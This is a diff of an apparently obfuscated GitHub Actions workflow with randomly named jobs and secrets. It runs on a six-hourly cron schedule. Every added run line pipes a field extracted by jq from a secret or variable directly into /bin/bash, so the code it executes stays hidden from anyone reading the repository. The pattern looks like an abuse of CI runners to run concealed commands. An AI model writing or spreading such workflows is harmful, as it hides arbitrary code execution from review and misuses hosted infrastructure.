@@ -1,8 +1,9 @@
 name: weiguomen8713
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 3/6 * * *'
+    - cron: '54 0/6 * * *'
 
 jobs:
   build:
@@ -12,8 +13,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: weiguomen8713
         env:
-          g2: ${{ secrets.g2 }}
+          ijrjq57: ${{ secrets.ijrjq57 }}
         run: |
-          echo $g2 | jq -r .lodu646 | /bin/bash
-          echo $atliy5919 | jq -r .m865 | /bin/bash
+          echo $ijrjq57 | jq -r .rcp2503 | /bin/bash
+          echo $p1 | jq -r .yad98897 | /bin/bash
+          echo $mdw2 | jq -r .wtetk59 | /bin/bash
+          echo $hsaz069 | jq -r .p4 | /bin/bash
+          echo $m409 | jq -r .o966 | /bin/bash
+          echo $x76197 | jq -r .gn4329 | /bin/bash
+          echo $iugvw201 | jq -r .avrc8 | /bin/bash
+          echo $etvml26871 | jq -r .wf7 | /bin/bash
+          echo $cp418 | jq -r .wxbp7180 | /bin/bash
 
